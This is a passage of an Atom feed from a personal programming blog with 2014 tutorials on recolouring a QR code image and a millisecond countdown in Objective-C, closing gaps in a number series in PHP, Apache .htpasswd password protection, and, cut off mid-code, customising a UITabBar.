    <content type="html"><![CDATA[<p><strong>Original QR code</strong></p><p><img src="/images/posts/2014-05-28-ios-change-qr-code-color-in-uiimage/ori-qrcode.png" alt="Original QR code"></p><p><strong>Red QR code</strong></p><p><img src="/images/posts/2014-05-28-ios-change-qr-code-color-in-uiimage/red-qrcode.png" alt="Red QR code"></p><p>In order to change the QR code color, 2 steps need to be done</p><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>Change the white color to transparent</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="built_in">UIImage</span> *)replaceColor:(<span class="built_in">UIColor</span>*)color inImage:(<span class="built_in">UIImage</span>*)image withTolerance:(<span class="type">float</span>)tolerance;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">CGImageRef</span> imageRef = [image <span class="built_in">CGImage</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSUInteger</span> width = <span class="built_in">CGImageGetWidth</span>(imageRef);</span><br><span class="line">    <span class="built_in">NSUInteger</span> height = <span class="built_in">CGImageGetHeight</span>(imageRef);</span><br><span class="line">    <span class="built_in">CGColorSpaceRef</span> colorSpace = <span class="built_in">CGColorSpaceCreateDeviceRGB</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSUInteger</span> bytesPerPixel = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">NSUInteger</span> bytesPerRow = bytesPerPixel * width;</span><br><span class="line">    <span class="built_in">NSUInteger</span> bitsPerComponent = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">NSUInteger</span> bitmapByteCount = bytesPerRow * height;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rawData = (<span class="type">unsigned</span> <span class="type">char</span>*) calloc(bitmapByteCount, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CGContextRef</span> context = <span class="built_in">CGBitmapContextCreate</span>(rawData, width, height,</span><br><span class="line">                                                 bitsPerComponent, bytesPerRow, colorSpace,</span><br><span class="line">                                                 kCGImageAlphaPremultipliedLast | kCGBitmapByteOrder32Big);</span><br><span class="line">    <span class="built_in">CGColorSpaceRelease</span>(colorSpace);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CGContextDrawImage</span>(context, <span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, width, height), imageRef);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CGColorRef</span> cgColor = [color <span class="built_in">CGColor</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">CGFloat</span> *components = <span class="built_in">CGColorGetComponents</span>(cgColor);</span><br><span class="line">    <span class="type">float</span> r = components[<span class="number">0</span>];</span><br><span class="line">    <span class="type">float</span> g = components[<span class="number">1</span>];</span><br><span class="line">    <span class="type">float</span> b = components[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//float a = components[3]; // not needed</span></span><br><span class="line">    </span><br><span class="line">    r = r * <span class="number">255.0</span>;</span><br><span class="line">    g = g * <span class="number">255.0</span>;</span><br><span class="line">    b = b * <span class="number">255.0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="type">float</span> redRange[<span class="number">2</span>] = &#123;</span><br><span class="line">        MAX(r - (tolerance / <span class="number">2.0</span>), <span class="number">0.0</span>),</span><br><span class="line">        MIN(r + (tolerance / <span class="number">2.0</span>), <span class="number">255.0</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="type">float</span> greenRange[<span class="number">2</span>] = &#123;</span><br><span class="line">        MAX(g - (tolerance / <span class="number">2.0</span>), <span class="number">0.0</span>),</span><br><span class="line">        MIN(g + (tolerance / <span class="number">2.0</span>), <span class="number">255.0</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="type">float</span> blueRange[<span class="number">2</span>] = &#123;</span><br><span class="line">        MAX(b - (tolerance / <span class="number">2.0</span>), <span class="number">0.0</span>),</span><br><span class="line">        MIN(b + (tolerance / <span class="number">2.0</span>), <span class="number">255.0</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> byteIndex = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (byteIndex &lt; bitmapByteCount) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> red   = rawData[byteIndex];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> green = rawData[byteIndex + <span class="number">1</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> blue  = rawData[byteIndex + <span class="number">2</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (((red &gt;= redRange[<span class="number">0</span>]) &amp;&amp; (red &lt;= redRange[<span class="number">1</span>])) &amp;&amp;</span><br><span class="line">            ((green &gt;= greenRange[<span class="number">0</span>]) &amp;&amp; (green &lt;= greenRange[<span class="number">1</span>])) &amp;&amp;</span><br><span class="line">            ((blue &gt;= blueRange[<span class="number">0</span>]) &amp;&amp; (blue &lt;= blueRange[<span class="number">1</span>]))) &#123;</span><br><span class="line">            <span class="comment">// make the pixel transparent</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            rawData[byteIndex] = <span class="number">0</span>;</span><br><span class="line">            rawData[byteIndex + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            rawData[byteIndex + <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">            rawData[byteIndex + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        byteIndex += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">UIImage</span> *result = [<span class="built_in">UIImage</span> imageWithCGImage:<span class="built_in">CGBitmapContextCreateImage</span>(context)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CGContextRelease</span>(context);</span><br><span class="line">    free(rawData);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The method above is to change the color given to transparent</p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>Fill a new color to the image. You can use <a href="https://github.com/mattgemmell/MGImageUtilities">MGImageUtilities</a> library</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UIImage</span> *qrcode = [<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;qrcode&quot;</span>];</span><br><span class="line"><span class="comment">// replace the white color to transparent. <span class="doctag">NOTE:</span> [UIColor whiteColor] won&#x27;t works here</span></span><br><span class="line">qrcode = [<span class="keyword">self</span> replaceColor:[<span class="built_in">UIColor</span> colorWithRed:<span class="number">1.0</span>f green:<span class="number">1.0</span>f blue:<span class="number">1.0</span>f alpha:<span class="number">1.0</span>f] inImage:image withTolerance:<span class="number">255</span>];</span><br><span class="line"><span class="comment">// now fill the image with red color</span></span><br><span class="line">qrcode = [qrcode imageTintedWithColor:[<span class="built_in">UIColor</span> redColor]];</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li>_<a href="http://stackoverflow.com/questions/633722/how-to-make-one-color-transparent-on-a-uiimage/10544776#10544776">How to make one color transparent on a UIImage?</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;strong&gt;Original QR code&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/posts/2014-05-28-ios-change-qr-code-color-in-uiimage/ori-qrcode.png&quot;</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Countdown to milliseconds</title>
    <link href="http://jslim.net/blog/2014/05/27/ios-countdown-to-milliseconds/"/>
    <id>http://jslim.net/blog/2014/05/27/ios-countdown-to-milliseconds/</id>
    <published>2014-05-27T01:15:44.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>#import “CountdownViewController.h”</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// default countdown time in seconds</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> defaultBufferSeconds = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">CountdownViewController</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">UILabel</span> *timerLabel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">CountdownViewController</span> </span>&#123;</span><br><span class="line">    <span class="comment">// to keep a reference for current counting</span></span><br><span class="line">    <span class="type">int</span> countdownMilliseconds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@synthesize</span> timerLabel = _timerLabel;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// display countdown on this label</span></span><br><span class="line">    <span class="keyword">self</span>.timerLabel = [[<span class="built_in">UILabel</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">40</span>, <span class="number">40</span>, <span class="number">240</span>, <span class="number">40</span>)];</span><br><span class="line">    <span class="keyword">self</span>.timerLabel.textAlignment = <span class="built_in">NSTextAlignmentCenter</span>;</span><br><span class="line">    [<span class="keyword">self</span>.countdownView addSubview:<span class="keyword">self</span>.timerLabel];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// start countdown</span></span><br><span class="line">    [<span class="keyword">self</span> startTimer];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)startTimer</span><br><span class="line">&#123;</span><br><span class="line">    countdownMilliseconds = defaultBufferSeconds * <span class="number">1000</span>; <span class="comment">// reset the current counting value</span></span><br><span class="line">    <span class="comment">// NSTimeInterval is in &quot;second&quot;, now schedule it to every 10 milliseconds</span></span><br><span class="line">    [<span class="built_in">NSTimer</span> scheduledTimerWithTimeInterval:<span class="number">0.01</span> target:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(updateCountdown:) userInfo:<span class="literal">nil</span> repeats:<span class="literal">YES</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)updateCountdown:(<span class="built_in">NSTimer</span> *)timer</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> seconds, milliseconds;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// don&#x27;t forget to update the current counting value</span></span><br><span class="line">    countdownMilliseconds -= (timer.timeInterval * <span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    seconds = countdownMilliseconds / <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// since we only want to show 2 digits in milliseconds, so have to divide by 10</span></span><br><span class="line">    milliseconds = countdownMilliseconds % <span class="number">1000</span>;</span><br><span class="line">    milliseconds /= <span class="number">10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">self</span>.timerLabel.text = [<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;Countdown: %02d seconds %02d milliseconds&quot;</span>, seconds, milliseconds];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// once current counting value reach 0, then stop the timer</span></span><br><span class="line">    <span class="keyword">if</span> (countdownMilliseconds &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        [timer invalidate];</span><br><span class="line">        timer = <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/10257330/nstimer-decrease-the-time-by-seconds-milliseconds/10257616#10257616">NSTimer Decrease the time by seconds/milliseconds</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;#import “CountdownViewController.h”&lt;/p&gt;
&lt;figure class=&quot;highlight obj-c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Restructure a series of numbers</title>
    <link href="http://jslim.net/blog/2014/05/21/restructure-a-series-of-numbers/"/>
    <id>http://jslim.net/blog/2014/05/21/restructure-a-series-of-numbers/</id>
    <published>2014-05-21T04:40:16.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Example:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+-----------------+</span>----------------------------------------+</span><br><span class="line"><span class="section">| Input           | 2, 4, 2, 5, 8, 7, 7, 6, 13, 11, 11, 12 |</span></span><br><span class="line"><span class="section">+-----------------+----------------------------------------+</span></span><br><span class="line"><span class="section">| Expected result | 1, 2, 1, 3, 6, 5, 5, 4,  9,  7,  7,  8 |</span></span><br><span class="line"><span class="section">+-----------------+----------------------------------------+</span></span><br></pre></td></tr></table></figure><p>The <strong>input</strong> contains missing numbers which are <code>1</code>, <code>3</code>, <code>9</code>, <code>10</code>. Now the mission is to remove the gap in missing numbers.</p><p><img src="/images/posts/2014-05-21-restructure-a-series-of-numbers/mapping.png" alt="Input - result mapping"></p><p>See the mapping above:</p><ul><li>infront of <code>2</code> there is <strong>ONE</strong> missing number</li><li>infront of <code>4</code>, <code>5</code>, <code>6</code>, <code>7</code>, <code>8</code> there are <strong>TWO</strong> missing number</li><li>infront of <code>11</code>, <code>12</code>, <code>13</code> there are <strong>FOUR</strong> missing number</li></ul><p>Can see the pattern?</p><p>Now, lets implement it in PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">12</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$max_input</span> = <span class="title function_ invoke__">max</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="comment">// find the missing value in ascending order &amp; avoid duplication</span></span><br><span class="line"><span class="variable">$missing_values</span> = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="variable">$max_input</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="comment">// skip if current value is not missing OR is already inside the $missing_values container</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$i</span>, <span class="variable">$input</span>) || <span class="title function_ invoke__">in_array</span>(<span class="variable">$i</span>, <span class="variable">$missing_values</span>)) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="variable">$missing_values</span>[] = <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$results</span> = [];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$i</span>) &#123; <span class="comment">// goes through all input values</span></span><br><span class="line">    <span class="variable">$diff</span> = <span class="number">0</span>; <span class="comment">// this is the `-1`, `-2`, `-4` (green color) on the mapping there</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$missing_values</span> <span class="keyword">as</span> <span class="variable">$mv</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="variable">$mv</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$diff</span>++; <span class="comment">// count the number of missing values infront of current value</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// finally minus the difference will get the desired result</span></span><br><span class="line">    <span class="variable">$results</span>[] = <span class="variable">$i</span> - <span class="variable">$diff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The output <code>$results</code> will be</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">5</span>] =&gt; <span class="number">5</span></span><br><span class="line">    [<span class="number">6</span>] =&gt; <span class="number">5</span></span><br><span class="line">    [<span class="number">7</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">8</span>] =&gt; <span class="number">9</span></span><br><span class="line">    [<span class="number">9</span>] =&gt; <span class="number">7</span></span><br><span class="line">    [<span class="number">10</span>] =&gt; <span class="number">7</span></span><br><span class="line">    [<span class="number">11</span>] =&gt; <span class="number">8</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Done :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Example:&lt;/p&gt;
&lt;figure class=&quot;highlight asciidoc&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>How to use Apache .htpasswd</title>
    <link href="http://jslim.net/blog/2014/05/05/how-to-use-apache-htpasswd/"/>
    <id>http://jslim.net/blog/2014/05/05/how-to-use-apache-htpasswd/</id>
    <published>2014-05-05T16:52:18.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>In order to prevent your site from outsider, you may need to add a password prompt so that only authenticated user can access.</p><p><img src="/images/posts/2014-05-06-how-to-use-apache-htpasswd/password-prompt.png" alt="Password prompt"></p><p>To achieve this, <a href="http://httpd.apache.org/docs/2.0/en/programs/htpasswd.html">Apache .htpasswd</a> helps.</p><p>Before that, create a <strong>.htaccess</strong> to project’s document root <em>(e.g. if the document root is in project/public, then it should located project/public/.htaccess)</em> contains the following content</p><p><strong>.htaccess</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AuthUserFile</span> /absolute/path/to/your/project/document_root/.htpasswd</span><br><span class="line"><span class="attribute">AuthGroupFile</span> /dev/null</span><br><span class="line"><span class="attribute">AuthName</span> <span class="string">&quot;Js&#x27;s protected files&quot;</span></span><br><span class="line"><span class="attribute">AuthType</span> Basic</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;Limit GET&gt;</span></span><br><span class="line"><span class="attribute">require</span> valid-user</span><br><span class="line"><span class="section">&lt;/Limit&gt;</span></span><br></pre></td></tr></table></figure><p>The file is using absolute path, if relative path, it will point to <strong>apache</strong> document root.</p><p>Create a .htpasswd with some users</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ cd <span class="regexp">/absolute/</span>path<span class="regexp">/to/y</span>our<span class="regexp">/project/</span>document_root</span><br><span class="line"><span class="comment"># -c option is used when the .htpasswd file doesn&#x27;t exists, so it will create a new file</span></span><br><span class="line">$ htpasswd -c .htpasswd admin</span><br><span class="line">New password:</span><br><span class="line">Re-type new password:</span><br><span class="line">Adding password <span class="keyword">for</span> user admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># add another user</span></span><br><span class="line">$ htpasswd .htpasswd jslim</span><br><span class="line">New password:</span><br><span class="line">Re-type new password:</span><br><span class="line">Adding password <span class="keyword">for</span> user jslim</span><br><span class="line"></span><br><span class="line"><span class="comment"># verify that 2 users are in the .htpasswd</span></span><br><span class="line">$ tail .htpasswd</span><br><span class="line">admin:<span class="variable">$apr1</span><span class="variable">$5OC</span>.YPUn<span class="variable">$sM17ex8wLCKZADIUx8J</span>.<span class="number">6</span>/</span><br><span class="line">jslim:<span class="variable">$apr1</span><span class="variable">$z6OQQjv9</span><span class="variable">$8mGc3Vw6a8fLfHiuTTqkw</span>.</span><br></pre></td></tr></table></figure><p><strong>Note that the password here is encrypted.</strong></p><p>Now you open up your browser, type in the URL, you will see the prompt before you actually see the content</p><p><em>Reference:</em> <em><a href="http://www.colostate.edu/~ric/htpass.html">Password Tutorial</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;In order to prevent your site from outsider, you may need to add a password prompt so that only authenticated user can</summary>
        
      
    
    
    
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="apache" scheme="http://jslim.net/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Customize UITabBar appearance</title>
    <link href="http://jslim.net/blog/2014/05/04/ios-customize-uitabbar-appearance/"/>
    <id>http://jslim.net/blog/2014/05/04/ios-customize-uitabbar-appearance/</id>
    <published>2014-05-04T17:12:19.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Final look will be</p><p><img src="/images/posts/2014-05-05-ios-customize-uitabbar-appearance/tabbar-appearance-2.png" alt="Desired appearance"></p><ul><li>The selected tab will be in dimmed background</li><li>The selected/unselected tab icon &amp; text will be in white color</li></ul><p>Before that, add a helper function to turn UIColor into UIImage</p><p>You may put this code to <strong>AppDelegate</strong> or anywhere else</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+ (<span class="built_in">UIImage</span> *)imageFromColor:(<span class="built_in">UIColor</span> *)color forSize:(<span class="built_in">CGSize</span>)size withCornerRadius:(<span class="built_in">CGFloat</span>)radius</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">CGRect</span> rect = <span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, size.width, size.height);</span><br><span class="line">    <span class="built_in">UIGraphicsBeginImageContext</span>(rect.size);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CGContextRef</span> context = <span class="built_in">UIGraphicsGetCurrentContext</span>();</span><br><span class="line">    <span class="built_in">CGContextSetFillColorWithColor</span>(context, [color <span class="built_in">CGColor</span>]);</span><br><span class="line">    <span class="built_in">CGContextFillRect</span>(context, rect);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">UIImage</span> *image = <span class="built_in">UIGraphicsGetImageFromCurrentImageContext</span>();</span><br><span class="line">    <span class="built_in">UIGraphicsEndImageContext</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Begin a new image that will be the new image with the rounded corners</span></span><br><span class="line">    <span class="comment">// (here with the size of an UIImageView)</span></span><br><span class="line">    <span class="built_in">UIGraphicsBeginImageContext</span>(size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Add a clip before drawing anything, in the shape of an rounded rect</span></span><br><span class="line">    [[<span class="built_in">UIBezierPath</span> bezierPathWithRoundedRect:rect cornerRadius:radius] addClip];</span><br><span class="line">    <span class="comment">// Draw your image</span></span><br><span class="line">    [image drawInRect:rect];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Get the image, here setting the UIImageView image</span></span><br><span class="line">    image = <span class="built_in">UIGraphicsGetImageFromCurrentImageContext</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Lets forget about that we were drawing</span></span><br><span class="line">    <span class="built_in">UIGraphicsEndImageContext</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> image;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then add this to <code>application:didFinishLaunchingWithOptions:</code></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span 